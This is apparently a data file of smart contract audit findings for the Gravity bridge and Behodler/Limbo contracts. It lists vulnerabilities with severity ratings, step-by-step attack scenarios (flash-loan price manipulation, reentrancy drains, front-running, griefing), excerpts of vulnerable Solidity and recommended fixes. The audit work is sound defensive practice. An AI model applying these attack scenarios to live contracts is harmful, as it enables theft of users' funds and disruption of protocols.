27.md,Large `ValSets` potentially freezes `Gravity.sol`,low,"Gas requirements of `makeCheckpoint`: If the size of the validator set grows large enough during a time of block-size expansion, it may be possible to make the validator set large enough that, when the block size shrinks, the gas required to perform `makeCheckpoint` may be larger than the amount of gas available in the block. In that case, the validator set could not be updated until the block size increased. If a reduction in upper gas limit for blocks occurs at the miner layer, it may be bricked permanently."
27.md,ERC20s that block transfer to particular addresses enable DoS/Censorship,low,"Tokens that prevent transfers to particular addresses (most commonly `address(0)` as is the [OpenZeppelin standard](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/aefcb3e8aa4ee8da8e2b7022ffe4dcb57fbb0fdf/contracts/token/ERC20/ERC20.sol#L226)) enables DoS against a batch. If the attacker submits the bad transaction, the relayer wont submit the batch. The attacker never has to worry about the transaction being submitted and paying the fee because the transaction will fail, leaving the relayer stuck with the bill. This can enable MEV between chains by disabling others' ability to close arbitrage between chains by denying them their transfers off the chain."
27.md,Downcasting Can Freeze The Chain,low,"The function `utils::downcast_uint256() -> Option<u64>` returns `None` if the input value is greater than `U64MAX`.  If the value being downcast is read from a contract (e.g. a nonce), and the contract could be put into such a state where a `Uint256` is set to higher value, this will cause all nodes to halt execution upon reading this value, requiring a patch to reenable the bridge.

#### Recommendation

Change the signature of `downcast_uint256()` to return a `Result<>`, and/or remove any `unwrap()`s of the result."
27.md,Validations of parameters,low,"#### Impact
There are a few validations that could be added to the system:
the constructor could check that `_gravityId` is not empty. `state_powerThreshold` should always be greater than 0, otherwise, anyone will be available to execute actions.

#### Recommended Mitigation Steps
Consider implementing suggested validations."
27.md,SafeMath library is not always used in `Gravity`,low,"#### Impact
SafeMath library functions are not always used in the `Gravity` contract's arithmetic operations, which could cause integer underflow/overflows. Using SafeMath is considered a best practice that could completely prevent underflow/overflows and increase code consistency.

#### Proof of Concept
Referenced code:
* [Gravity.sol#L202](https://github.com/althea-net/cosmos-gravity-bridge/blob/92d0e12cea813305e6472851beeb80bd2eaf858d/solidity/contracts/Gravity.sol#L202)
* [Gravity.sol#L586](https://github.com/althea-net/cosmos-gravity-bridge/blob/92d0e12cea813305e6472851beeb80bd2eaf858d/solidity/contracts/Gravity.sol#L586)

#### Recommended Mitigation Steps
Consider using the SafeMath library functions in the referenced lines of code."
27.md,Possible miner incentive for chain reorgs if `ETHBlockDelay` is too small,low,"#### Impact
If `ETHBlockDelay` is too small and the incentive for miners is large enough, it would be profitable for miners to attempt
to double spend by depositing assets, waiting for confirmation on the cosmos-SDK and then reorging the blockchain.

Although an attack like this has never been done, it could potentially cost hundreds of millions of dollars in damages. With MEV at all time highs and miners regularly using custom geth implementations its not totally out of the question to see an attack similar to this happening soon.

#### Recommended Mitigation Steps
The best way to avoid something like this is to make sure to wait for a large number of blocks until a transaction is confirmed by the cosmos system."
27.md,`cumulativePower` check should be inclusive,low,"#### Impact
Based on my understanding `cumulativePower` checks should be inclusive to indicate when the threshold is met. Otherwise, there might be impossible to reach it in certain cases (e.g. when 100% power is required). Replace `>` with `>=` in constructor and function `checkValidatorSignatures`:

```solidity
if (cumulativePower > \_powerThreshold) {
    break;
}
require(
    cumulativePower > \_powerThreshold,
    ""Submitted validator set signatures do not have enough power.""
);
```
#### Recommended Mitigation Steps
`cumulativePower >= \_powerThreshold`"
78.md,Lack of access control on `assertGovernanceApproved` can cause funds to be locked,high,"Lack of access control on the `assertGovernanceApproved` function of `FlashGovernanceArbiter` allows anyone to lock other users' funds in the contract as long as the users have approved the contract to transfer `flashGovernanceConfig.amount` of `flashGovernanceConfig.asset` from them.

#### Proof of Concept

1.  Alice wants to execute a flash governance decision (e.g., disable to the protocol), so she first calls `approve` on the `flashGovernanceConfig.asset` to allow `FlashGovernanceArbiter` to transfer `flashGovernanceConfig.amount` of assets from her.
2.  An attacker Bob, who listens to the mempool, notices Alice's `approve` transaction and decides to front-run it. He calls `assertGovernanceApproved` with `sender` being Alice, `target` being any address, and `emergency` being `true`.
3.  As a result, Alice cannot execute her flash governance decision, and her funds are locked in the contract for the `flashGovernanceConfig.unlockTime` period.

Referenced code:
[DAO/FlashGovernanceArbiter.sol#L60-L81](https://github.com/code-423n4/2022-01-behodler/blob/main/contracts/DAO/FlashGovernanceArbiter.sol#L60-L81)

#### Recommended Mitigation Steps

Only allow certain addresses to call the `assertGovernanceApproved` function on `FlashGovernanceArbiter`.





***"
78.md,wrong minting amount,high,"<https://github.com/code-423n4/2022-01-behodler/blob/main/contracts/TokenProxies/RebaseProxy.sol#L36>

```solidity
uint256 proxy = (baseBalance * ONE) / _redeemRate;
```

should be:
```solidity
uint256 proxy = (amount * ONE) / _redeemRate;
```





***"
78.md,Double transfer in the `transferAndCall` function of `ERC677`,high,"The implementation of the `transferAndCall` function in `ERC677` is incorrect. It transfers the `_value` amount of tokens twice instead of once. Since the `Flan` contract inherits `ERC667`, anyone calling the `transferAndCall` function on `Flan` is affected by this double-transfer bug.

#### Proof of Concept

Below is the implementation of `transferAndCall`:
```solidity
function transferAndCall(
  address _to,
  uint256 _value,
  bytes memory _data
) public returns (bool success) {
  super.transfer(_to, _value);
  _transfer(msg.sender, _to, _value);
  if (isContract(_to)) {
      contractFallback(_to, _value, _data);
  }
  return true;
}
```

We can see that `super.transfer(_to, _value);` and `_transfer(msg.sender, _to, _value);` are doing the same thing - transfering `_value` of tokens from `msg.sender` to `_to`.

Referenced code:
[ERC677/ERC677.sol#L28-L29](https://github.com/code-423n4/2022-01-behodler/blob/main/contracts/ERC677/ERC677.sol#L28-L29)

#### Recommended Mitigation Steps

Remove `_transfer(msg.sender, _to, _value);` in the `transferAndCall` function.

 >[Behodler/limbo#3](https://github.com/Behodler/limbo/pull/3)



***"
78.md,Logic error in `burnFlashGovernanceAsset` can cause locked assets to be stolen,high,"A logic error in the `burnFlashGovernanceAsset` function that resets a user's `pendingFlashDecision` allows that user to steal other user's assets locked in future flash governance decisions. As a result, attackers can get their funds back even if they execute a malicious flash decision and the community burns their assets.

#### Proof of Concept

1.  An attacker Alice executes a malicious flash governance decision, and her assets are locked in the `FlashGovernanceArbiter` contract.
2.  The community disagrees with Alice's flash governance decision and calls `burnFlashGovernanceAsset` to burn her locked assets. However, the `burnFlashGovernanceAsset` function resets Alice's `pendingFlashDecision` to the default config (see line 134).
3.  A benign user, Bob executes another flash governance decision, and his assets are locked in the contract.
4.  Now, Alice calls `withdrawGovernanceAsset` to withdraw Bob's locked asset, effectively the same as stealing Bob's assets. Since Alice's `pendingFlashDecision` is reset to the default, the `unlockTime < block.timestamp` condition is fulfilled, and the withdrawal succeeds.

Referenced code:
[DAO/FlashGovernanceArbiter.sol#L134](https://github.com/code-423n4/2022-01-behodler/blob/main/contracts/DAO/FlashGovernanceArbiter.sol#L134)
[DAO/FlashGovernanceArbiter.sol#L146](https://github.com/code-423n4/2022-01-behodler/blob/main/contracts/DAO/FlashGovernanceArbiter.sol#L146)

#### Recommended Mitigation Steps

Change line 134 to `delete pendingFlashDecision[targetContract][user]` instead of setting the `pendingFlashDecision` to the default.





***"
78.md,Flash loan price manipulation in `purchasePyroFlan()`,high,"The comment on [line 54](https://github.com/code-423n4/2022-01-behodler/blob/cedb81273f6daf2ee39ec765eef5ba74f21b2c6e/contracts/FlanBackstop.sol#L54) of FlanBackstop.sol states ""the opportunity for price manipulation through flash loans exists"", and I agree that this is a serious risk. While the acceptableHighestPrice variable attempts to limit the maximum price change of the flan-stablecoin LP, a flashloan sandwich attack can still occur within this limit and make up for the limitation with larger volumes or multiple flashloan attacks. Flashloan price manipulation is the cause for many major hacks, including [bZx](https://bzx.network/blog/postmortem-ethdenver), [Harvest](https://rekt.news/harvest-finance-rekt/), and others.

#### Proof of Concept

[Line 83](https://github.com/code-423n4/2022-01-behodler/blob/cedb81273f6daf2ee39ec765eef5ba74f21b2c6e/contracts/FlanBackstop.sol#L83) of FlanBackstop.sol calculates the price of flan to stablecoin in the Uniswap pool based on the balances at a single point in time. Pool balances at a single point in time can be manipulated with flash loans, which can skew the numbers to the extreme. The single data point of LP balances is used to calculate [the growth variable in line 103](https://github.com/code-423n4/2022-01-behodler/blob/cedb81273f6daf2ee39ec765eef5ba74f21b2c6e/contracts/FlanBackstop.sol#L103), and the growth variable influences the quantity of pyroflan a user receives in [the premium calculation on line 108](https://github.com/code-423n4/2022-01-behodler/blob/cedb81273f6daf2ee39ec765eef5ba74f21b2c6e/contracts/FlanBackstop.sol#L108).

```solidity
uint256 priceBefore = (balanceOfFlanBefore * getMagnitude(stablecoin)) / balanceOfStableBefore;
uint256 growth = ((priceBefore - tiltedPrice) * 100) / priceBefore;
uint256 premium = (flanToMint * (growth / 2)) / 100;
```

Problems can occur when the volumes that the `purchasePyroFlan()` function sends to the Uniswap pool are large compared to the pool's liquidity volume, or if the Uniswap pool price is temporarily tilted with a flashloan (or a whale). Because this function purposefully changes the exchange rate of the LP, by transferring tokens to the LP in a 2-to-1 ratio, a large volume could caught a large price impact in the LP. The code attempts to protect against this manipulation in [line 102](https://github.com/code-423n4/2022-01-behodler/blob/cedb81273f6daf2ee39ec765eef5ba74f21b2c6e/contracts/FlanBackstop.sol#L102) with a require statement, but this can be worked around by reducing the volume per flashloan and repeating the attack multiple times. A user can manipulate the LP, especially when the LP is new with low liquidity, in order to achieve large amounts of flan and pyroflan.

#### Recommended Mitigation Steps

Use a TWAP instead of the pool price at a single point in time to increase the cost of performing a flashloan sandwich attack. See [the Uniswap v2 price oracle solution ](https://docs.uniswap.org/protocol/V2/concepts/core-concepts/oracles)documentation for more explanations on how Uniswap designed an approach to providing asset prices while reducing the change of manipulation.




***"
78.md,Loss Of Flash Governance Tokens If They Are Not Withdrawn Before The Next Request,high,"Users who have not called [withdrawGovernanceAsset()](https://github.com/code-423n4/2022-01-behodler/blob/main/contracts/DAO/FlashGovernanceArbiter.sol#L142)  after  they have locked their tokens from a previous proposal (i.e. [assertGovernanceApproved](https://github.com/code-423n4/2022-01-behodler/blob/main/contracts/DAO/FlashGovernanceArbiter.sol#L60)), will lose their tokens if [assertGovernanceApproved()](https://github.com/code-423n4/2022-01-behodler/blob/main/contracts/DAO/FlashGovernanceArbiter.sol#L60) is called again with the same `target` and `sender`.

The `sender` will lose `pendingFlashDecision[target][sender].amount` tokens and the tokens will become unaccounted for and locked in the contract. Since the new amount is not added to the previous amount, instead the previous amount is overwritten with the new amount.

The impact of this is worsened by another vulnerability, that is [assertGovernanceApproved()](https://github.com/code-423n4/2022-01-behodler/blob/main/contracts/DAO/FlashGovernanceArbiter.sol#L60) is a `public` function and may be called by any arbitrary user so long as the `sender` field has called `approve()` for `FlashGovernanceArbiter` on the ERC20 token. This would allow an attacker to make these tokens inaccessible for any arbitrary `sender`.

#### Proof of Concept

In [assertGovernanceApproved()](https://github.com/code-423n4/2022-01-behodler/blob/main/contracts/DAO/FlashGovernanceArbiter.sol#L60) as seen below, the line`pendingFlashDecision[target][sender] = flashGovernanceConfig` will overwrite the previous contents. Thereby, making any previous rewards unaccounted for and inaccessible to anyone.

Note that we must wait `pendingFlashDecision[target][sender].unlockTime` between calls.
```solidity
function assertGovernanceApproved(
  address sender,
  address target,
  bool emergency
) public {
  if (
    IERC20(flashGovernanceConfig.asset).transferFrom(sender, address(this), flashGovernanceConfig.amount) &&
    pendingFlashDecision[target][sender].unlockTime < block.timestamp
  ) {
    require(
      emergency || (block.timestamp - security.lastFlashGovernanceAct > security.epochSize),
      ""Limbo: flash governance disabled for rest of epoch""
    );
    pendingFlashDecision[target][sender] = flashGovernanceConfig;
    pendingFlashDecision[target][sender].unlockTime += block.timestamp;

    security.lastFlashGovernanceAct = block.timestamp;
    emit flashDecision(sender, flashGovernanceConfig.asset, flashGovernanceConfig.amount, target);
  } else {
    revert(""LIMBO: governance decision rejected."");
  }
}
```
#### Recommended Mitigation Steps

Consider updating the initial if statement to ensure the `pendingFlashDecision` for that `target` and `sender` is empty, that is:
```solidity
function assertGovernanceApproved(
  address sender,
  address target,
  bool emergency
) public {
  if (
    IERC20(flashGovernanceConfig.asset).transferFrom(sender, address(this), flashGovernanceConfig.amount) &&
    pendingFlashDecision[target][sender].unlockTime == 0
  ) {
...
```
Note we cannot simply add the new `amount` to the previous `amount` incase the underlying `asset` has been changed.




***"
78.md,LP pricing formula is vulnerable to flashloan manipulation,high,"The LP pricing formula used in the `burnAsset` function of `LimboDAO` is vulnerable to flashloan manipulation. By swapping a large number of EYE into the underlying pool, an attacker can intentionally inflate the value of the LP tokens to get more `fate` than he is supposed to with a relatively low cost.

With the large portion of `fate` he gets, he has more voting power to influence the system's decisions, or even he can convert his `fate` to Flan tokens for a direct profit.

#### Proof of Concept

Below is an example of how the attack works:

1.  Suppose that there are 1000 EYE and 1000 LINK tokens in the UniswapV2 LINK-EYE pool. The pool's total supply is 1000, and the attacker has 100 LP tokens.
2.  If the attacker burns his LP tokens, he earns `1000 * 100/1000 * 20 = 2000` amount of `fate`.
3.  Instead, the attacker swaps in 1000 EYE and gets 500 LINK from the pool (according to `x * y = k`, ignoring fees for simplicity). Now the pool contains 2000 EYE and 500 LINK tokens.
4.  After the manipulation, he burns his LP tokens and gets `2000 * 100/1000 * 20 = 4000` amount of `fate`.
5.  Lastly, he swaps 500 LINK into the pool to get back his 1000 EYE.
6.  Compared to Step 2, the attacker earns a double amount of `fate` by only paying the swapping fees to the pool. The more EYE tokens he swaps into the pool, the more `fate` he can get. This attack is practically possible by leveraging flashloans or flashswaps from other pools containing EYE tokens.

The `setEYEBasedAssetStake` function has the same issue of using a manipulatable LP pricing formula. For more detailed explanations, please refer to the analysis of the [Cheese Bank attack](https://peckshield.medium.com/cheese-bank-incident-root-cause-analysis-d076bf87a1e7) and the [Warp Finance attack](https://peckshield.medium.com/warpfinance-incident-root-cause-analysis-581a4869ee00).

Referenced code:
[DAO/LimboDAO.sol#L356](https://github.com/code-423n4/2022-01-behodler/blob/main/contracts/DAO/LimboDAO.sol#L356)
[DAO/LimboDAO.sol#L392](https://github.com/code-423n4/2022-01-behodler/blob/main/contracts/DAO/LimboDAO.sol#L392)

#### Recommended Mitigation Steps

Use a fair pricing formula for the LP tokens, for example, the one proposed by [Alpha Finance](https://blog.alphafinance.io/fair-lp-token-pricing/).





***"
78.md,Incorrect `unlockTime` can DOS `withdrawGovernanceAsset`,medium,"`unlockTime` is set incorrectly.

#### Proof of Concept

1.  Navigate to contract at <https://github.com/code-423n4/2022-01-behodler/blob/main/contracts/DAO/FlashGovernanceArbiter.sol>

2.  Observe the assertGovernanceApproved function

```solidity
function assertGovernanceApproved(
    address sender,
    address target,
    bool emergency
  ) public {
...
pendingFlashDecision[target][sender].unlockTime += block.timestamp;
...
}
```
3.  Assume assertGovernanceApproved is called with sender x and target y and pendingFlashDecision\[target]\[sender].unlockTime is 100 and block.timestamp is 10000 then

```solidity
pendingFlashDecision[target][sender].unlockTime += block.timestamp; // 10000+100=10100
```

4.  Again assertGovernanceApproved is called with same argument after timestamp 10100. This time unlockTime is set to very high value  (assume block.timestamp is 10500). This is incorrect

```solidity
pendingFlashDecision[target][sender].unlockTime += block.timestamp; // 10100+10500=20600
```

#### Recommended Mitigation Steps

Unlock time should be calculated like below:
```solidity
constant public CONSTANT_UNLOCK_TIME = 1 days; // example
pendingFlashDecision[target][sender].unlockTime = CONSTANT_UNLOCK_TIME +  block.timestamp;
```





***"
78.md,Reentrancy on Flash Governance Proposal Withdrawal,medium,"The function [withdrawGovernanceAsset()](https://github.com/code-423n4/2022-01-behodler/blob/main/contracts/DAO/FlashGovernanceArbiter.sol#L142) is vulnerable to reentrancy, which would allow the attacker to drain the balance of the `flashGoverananceConfig.asset`.

Note: this attack assumes the attacker may gain control of the execution flow in `asset.tranfer()` which is the case for many ERC20 tokens such as those that implement ERC777 but will depend on which asset is chosen in the configuration.

#### Proof of Concept

[withdrawGovernanceAsset()](https://github.com/code-423n4/2022-01-behodler/blob/main/contracts/DAO/FlashGovernanceArbiter.sol#L142) does not follow the check-effects-interactions pattern as seen from the following code snippet, where an external call is made before state modifications.

```solidity
function withdrawGovernanceAsset(address targetContract, address asset) public virtual {
  require(
    pendingFlashDecision[targetContract][msg.sender].asset == asset &&
      pendingFlashDecision[targetContract][msg.sender].amount > 0 &&
      pendingFlashDecision[targetContract][msg.sender].unlockTime < block.timestamp,
    ""Limbo: Flashgovernance decision pending.""
  );
  IERC20(pendingFlashDecision[targetContract][msg.sender].asset).transfer(
    msg.sender,
    pendingFlashDecision[targetContract][msg.sender].amount
  );
  delete pendingFlashDecision[targetContract][msg.sender];
}
```

The attacker can exploit this vulnerability through the following steps:

1.  `assertGovernanceApproved(userA, target, false)`
2.  wait for `unlockTime` seconds to pass
3.  `withdrawGovernanceAsset(target, asset)`  and gain control of the execution during `asset.transfer()`
4.  repeat step 3) until there balance of `FlashGovernanceArbiter` is less than `pendingFlashDecision[target][msg.sender].amount`

#### Recommended Mitigation Steps

There are two possible mitigations, the first is to implement the check-effects-interactions patter. This involves doing as checks and state changes before making external calls. To implement this in the current context delete the `pendingFlashDecision` before making the external call as follows.
```solidity
function withdrawGovernanceAsset(address targetContract, address asset) public virtual {
  require(
    pendingFlashDecision[targetContract][msg.sender].asset == asset &&
      pendingFlashDecision[targetContract][msg.sender].amount > 0 &&
      pendingFlashDecision[targetContract][msg.sender].unlockTime < block.timestamp,
    ""Limbo: Flashgovernance decision pending.""
  );
  uint256 amount = pendingFlashDecision[targetContract][msg.sender].amount;
  IERC20 asset = IERC20(pendingFlashDecision[targetContract][msg.sender].asset);
  delete pendingFlashDecision[targetContract][msg.sender];
  asset.transfer(msg.sender, amount);
}
```




***"
78.md,Burning a User's Tokens for a Flash Proposal will not Deduct Their Balance,medium,"The proposal to burn a user's tokens for a flash governance proposal does not result in the user losing any funds and may in fact unlock their funds sooner.

#### Proof of Concept

The function [burnFlashGovernanceAsset()](https://github.com/code-423n4/2022-01-behodler/blob/main/contracts/DAO/FlashGovernanceArbiter.sol#L124)  will simply overwrite the user's state with `pendingFlashDecision[targetContract][user] = flashGovernanceConfig;` as seen below.
```solidity
function burnFlashGovernanceAsset(
  address targetContract,
  address user,
  address asset,
  uint256 amount
) public virtual onlySuccessfulProposal {
  if (pendingFlashDecision[targetContract][user].assetBurnable) {
    Burnable(asset).burn(amount);
  }

  pendingFlashDecision[targetContract][user] = flashGovernanceConfig;
}
```
Since `flashGovernanceConfig` is not modified in [BurnFlashStakeDeposit.execute()](https://github.com/code-423n4/2022-01-behodler/blob/main/contracts/DAO/Proposals/BurnFlashStakeDeposit.sol#L39) the user will have `amount` set to the current config amount which is likely what they originally transferred in {assertGovernanceApproved()]\(<https://github.com/code-423n4/2022-01-behodler/blob/main/contracts/DAO/FlashGovernanceArbiter.sol#L60>).

Furthermore, `unlockTime` will be set to the config unlock time.  The config unlock time is the length of time in seconds that proposal should lock tokens for not the future timestamp. That is unlock time may be say `7 days` rather than `now + 7 days`. As a result the check in [withdrawGovernanceAsset()](https://github.com/code-423n4/2022-01-behodler/blob/main/contracts/DAO/FlashGovernanceArbiter.sol#L146)  `pendingFlashDecision[targetContract][msg.sender].unlockTime < block.timestamp,` will always pass unless there is a significant misconfiguration.

#### Recommended Mitigation Steps

Consider deleting the user's data (i.e. `delete pendingFlashDecision[targetContract][user]`) rather than setting it to the config. This would ensure the user cannot withraw any funds afterwards.

Alternatively, only update `pendingFlashDecision[targetContract][user].amount` to subtract the amount sent as a function parameter and leave the remaining fields untouched.





***"
78.md,"The system can get to a ""stuck"" state if a bad proposal (proposal that can't be executed) is accepted",medium,"#### LimboDAO.sol (`updateCurrentProposal()` modifier and `makeProposal()` function)

The LimboDAO contract has a variable that indicates the current proposal - every time there can be only one proposal. The only way a proposal can be done and a new proposal can be registered is to finish the previous proposal by either accepting it and executing it or by rejecting it. If a proposal that can't succeed, like for example an `UpdateMultipleSoulConfigProposal` proposal that has too much tokens and not enough gas, will stuck the system if it will be accepted. Thats because its time will pass - the users won't be able to vote anymore (because the `vote` function will revert), and the proposal can't be executed - the `execute` function will revert. So the proposal won't be able to be done and the system will be stuck because new proposal won't be able to be registered.

When trying to call the `executeCurrentProposal()` function that activates the `updateCurrentProposal()` modifier, the modifier will check the balance of fate, it will see that it's positive and will call `currentProposalState.proposal.orchestrateExecute()` to execute the proposal. the proposal will revert and cancel it all (leaving the proposal as the current proposal with `voting` state).

When trying to call `makeProposal()` function to make a new proposal it will revert because the current proposal is not equal to address(0).

To sum up, the system can get to a ""stuck"" state if a bad proposal (proposal that can't be executed) is accepted.







***"
78.md,flan can't be transferred unless the flan contract has flan balance greater than the amount we want to transfer,medium,"#### Flan.sol (`safeTransfer()` function)

The flan contract must have balance (and must have more flan then we want to transfer) in order to allow flan transfers. If it doesn't have any balance, the safeTransfer, which is the only way to transfer flan, will call `_transfer()` function with `amount = 0`. It should check `address(msg.sender)`'s balance instead of `address(this)`'s balance.

```solidity
function safeTransfer(address _to, uint256 _amount) external {
  uint256 flanBal = balanceOf(address(this)); // the problem is in this line
  uint256 flanToTransfer = _amount > flanBal ? flanBal : _amount;
  _transfer(_msgSender(), _to, flanToTransfer);
}
```






***"
78.md,Consistently check account balance before and after transfers for Fee-On-Transfer discrepencies,medium,"Wrong fateBalance bookkeeping for a user.
Wrong fateCreated value emitted.

#### Proof of Concept

Taking into account the FOT is done almost everywhere important in the solution already. That's a known practice in the solution.

However, it's missing here (see @audit-info tags):
```js
File: LimboDAO.sol
383:   function burnAsset(address asset, uint256 amount) public isLive incrementFate {
384:     require(assetApproved[asset], ""LimboDAO: illegal asset"");
385:     address sender = _msgSender();
386:     require(ERC677(asset).transferFrom(sender, address(this), amount), ""LimboDAO: transferFailed""); //@audit-info FOT not taken into account
387:     uint256 fateCreated = fateState[_msgSender()].fateBalance;
388:     if (asset == domainConfig.eye) {
389:       fateCreated = amount * 10; //@audit-info wrong amount due to lack of FOT calculation
390:       ERC677(domainConfig.eye).burn(amount);//@audit-info wrong amount due to lack of FOT calculation
391:     } else {
392:       uint256 actualEyeBalance = IERC20(domainConfig.eye).balanceOf(asset);
393:       require(actualEyeBalance > 0, ""LimboDAO: No EYE"");
394:       uint256 totalSupply = IERC20(asset).totalSupply();
395:       uint256 eyePerUnit = (actualEyeBalance * ONE) / totalSupply;
396:       uint256 impliedEye = (eyePerUnit * amount) / ONE;//@audit-info wrong amount due to lack of FOT calculation
397:       fateCreated = impliedEye * 20;
398:     }
399:     fateState[_msgSender()].fateBalance += fateCreated; //@audit-info potentially wrong fateCreated as fateCreated can be equal to amount * 10;  
400:     emit assetBurnt(_msgSender(), asset, fateCreated);//@audit-info potentially wrong fateCreated emitted
401:   }
```
#### Tools Used

VS Code

#### Recommended Mitigation Steps

Check the balance before and after the transfer to take into account the Fees-On-Transfer.





***"
78.md,Calling `generateFLNQuote` twice in every block prevents any migration,medium,"<https://github.com/code-423n4/2022-01-behodler/blob/71d8e0cfd9388f975d6a90dffba9b502b222bdfe/contracts/UniswapHelper.sol#L138>
In the Uniswap helper, `generateFLNQuote` is public, so any user can generate the latest quote. If you call this twice in any block, then the two latest flan quotes will have a `blockProduced` value of the current block's number.

These quotes are used in the `_ensurePriceStability` function. The last require statement here is key:
<https://github.com/code-423n4/2022-01-behodler/blob/71d8e0cfd9388f975d6a90dffba9b502b222bdfe/contracts/UniswapHelper.sol#L283-L285>

This function will revert if this statement is false:
```solidity
localFlanQuotes[0].blockProduced - localFlanQuotes[1].blockProduced > VARS.minQuoteWaitDuration
```

Since `VARS.minQuoteWaitDuration` is a `uint256`, it is at least 0
```solidity
localFlanQuotes[0].blockProduced - localFlanQuotes[1].blockProduced > 0
```

But, as we've shown above, we can create a transaction in every block that will make `localFlanQuotes[0].blockProduced - localFlanQuotes[1].blockProduced == 0`. In any block we can make any call to `_ensurePriceStability` revert.

`_ensurePriceStability` is called in the `ensurePriceStability` modifier:
<https://github.com/code-423n4/2022-01-behodler/blob/71d8e0cfd9388f975d6a90dffba9b502b222bdfe/contracts/UniswapHelper.sol#L70>

This modifier is used in `stabilizeFlan`:
<https://github.com/code-423n4/2022-01-behodler/blob/71d8e0cfd9388f975d6a90dffba9b502b222bdfe/contracts/UniswapHelper.sol#L162>

Lastly, `stabilizeFlan` is used in `migrate` in `Limbo.sol`
<https://github.com/code-423n4/2022-01-behodler/blob/71d8e0cfd9388f975d6a90dffba9b502b222bdfe/contracts/Limbo.sol#L234>

Therefore, we can grief a migration in any block. In reality, the `minQuoteWaitDuration` would be set to a much higher value than 0, making this even easier to grief for people (you only need to call `generateFLNQuote` every `minQuoteWaitDuration - 1` blocks to be safe).

### Mitigation

Mitigation is to just use a time weighted oracle for uniswap.





***"
78.md,Tolerance is not enforced during a flash governance decision,medium,"Most of the functions with a `governanceApproved` modifier call `flashGoverner.enforceTolerance` to ensure the provided parameters are restricted to some range of their original values. However, in the `governanceApproved` modifier, `flashGoverner.setEnforcement(true);` is called after the function body is executed, and thus the changed values are not restricted during the function execution.

An attacker can exploit this bug to change some critical parameters to arbitrary values by flash governance decisions. The effect will last until the community executes another proposal to correct the values. In the meanwhile, the attacker may make use of the corrupted values to launch an attack.

#### Proof of Concept

1.  An attacker executes a flash governance decision, for example, the `adjustSoul` function of `Limbo`, and sets the `fps` of a soul to an extremely large value.
2.  During the flash governance decision, some of his assets, for example, EYE, are locked in the `FlashGovernanceArbiter` contract.
3.  He calls `claimReward` to get his rewards on the corresponding soul (assume that he has staked some number of the token before). Because of the manipulated `fps`, he gets a large number of Flan tokens as the reward.
4.  Surely, he will lose his EYE tokens because of the malicious flash governance decision. However, as long as the attacker gets large enough Flan tokens, he is incentivized to launch such an attack.

Referenced code:
[DAO/Governable.sol#L46-L57](https://github.com/code-423n4/2022-01-behodler/blob/main/contracts/DAO/Governable.sol#L46-L57)
[Limbo.sol#L380-L381](https://github.com/code-423n4/2022-01-behodler/blob/main/contracts/Limbo.sol#L380-L381)
[Limbo.sol#L327-L329](https://github.com/code-423n4/2022-01-behodler/blob/main/contracts/Limbo.sol#L327-L329)
[Limbo.sol#L530](https://github.com/code-423n4/2022-01-behodler/blob/main/contracts/Limbo.sol#L530)
[Limbo.sol#L628-L630](https://github.com/code-423n4/2022-01-behodler/blob/main/contracts/Limbo.sol#L628-L630)

#### Recommended Mitigation Steps

Rewrite the `_governanceApproved` function and the `governanceApproved` modifier as follows:
```solidity
function _governanceApproved(bool emergency) internal {
  bool successfulProposal = LimboDAOLike(DAO).successfulProposal(msg.sender);
  if (successfulProposal) {
    flashGoverner.setEnforcement(false);
  } else if (configured) {
    flashGoverner.setEnforcement(true);
    flashGoverner.assertGovernanceApproved(msg.sender, address(this), emergency);
  }
}

modifier governanceApproved(bool emergency) {
  _governanceApproved(emergency);
  _;
}
```





***"
78.md,All the scxMinted is at risk of being burnt.(Limbo.sol),medium,"If one of the variables that calculate adjustedRectangle is a zero value,it will impair the calculation of excessSCX which would equal to all of the scxMinted on line 219.Nothing will be deducted from scxMinted on line 229 since adjustedRectangle =0 putting all of the former at risk of being burnt(line 230).

Also, the check on line 224 would not pass for high value migrations since scxMinted would always be greater than the adjustedRectangle.No scx would be avaliable to be sent to the AMM helper nor would there be any LP minted.

Furthermore, since SCX is needed to ensure the proper functioning of the protocol,ie, to provide liquidity and influence the value of Flan, it would be imperative that the correct value of excessScx is accounted for.

#### Recommended Mitigation Steps

Insert a require statement on line 222:
```solidity
require (AdjustedRectangle! =0, “ err”)
```




***"
78.md,user won't be able to get his rewards in case of staking with amount = 0,medium,"#### Limbo.sol (`stake()` function)

If a user has a pending reward and he calls the `stake` function with `amount = 0`, he won't be able to get his reward (he won't get the reward, and the reward debt will cover the reward)

That's happening because the reward calculation is done only if the staked amount (given as a parameter) is greater than 0, and it updates the reward debt also if the amount is 0, so the reward debt will be updated without the user will be able to get his reward





***"
78.md,You can grief migrations by sending SCX to the UniswapHelper,medium,"The attack here allows the attacker to prevent migrations.

The attack here is recoverable because we can just call `buyFlanAndBurn` (f it worked as expected) with SCX as the input token to buy Flan with the extra SCX, then run the migration again.

#### Proof of Concept

The attack here is simple:

1.  Get some SCX
2.  Send it to the UniswapHelper contract
3.  Any migration called will revert

My proof of concept test. You should be able to use this directly in the thig
<https://gist.github.com/CamdenClark/b6841ac7a63e868d90eff7d9a40e3e0a>

<https://github.com/code-423n4/2022-01-behodler/blob/cedb81273f6daf2ee39ec765eef5ba74f21b2c6e/contracts/UniswapHelper.sol#L167>

`localSCXBalance` is the SCX balance of the uniswap helper. <https://github.com/code-423n4/2022-01-behodler/blob/cedb81273f6daf2ee39ec765eef5ba74f21b2c6e/contracts/UniswapHelper.sol#L163>

But, the caller of `stablizeFlan` assumes that the `rectangleOfFairness` parameter is going to be equal to the amount of SCX that was sent
<https://github.com/code-423n4/2022-01-behodler/blob/cedb81273f6daf2ee39ec765eef5ba74f21b2c6e/contracts/Limbo.sol#L234>

#### Recommended Mitigation Steps

The mitigation could be to do `>=` instead of `==` so sending tokens can't grief this.

Beyond this though, why do you need to pass in rectangleOfFairness if we're requiring it to be a function of the localSCXBalance anyways? <https://github.com/code-423n4/2022-01-behodler/blob/cedb81273f6daf2ee39ec765eef5ba74f21b2c6e/contracts/UniswapHelper.sol#L167>





***"
78.md,You can flip governance decisions without extending vote duration,medium,"The impact here is that a user can, right at the end of the voting period, flip the decision without triggering the logic to extend the vote duration. The user doesn't even have to be very sophisticated: they can just send one vote in one transaction to go to 0, then in a subsequent transaction send enough to flip the vote.

#### Proof of Concept

<https://github.com/code-423n4/2022-01-behodler/blob/608cec2e297867e4d954a63fecd720e80c1d5ae8/contracts/DAO/LimboDAO.sol#L281>
You can send exactly enough fate to send the fate amount to 0, then send fate to change the vote. You'll never trigger this logic.

On the first call, to send the currentProposalState.fate to 0, `(fate + currentFate) * fate == 0`, so we won't extend the proposal state.

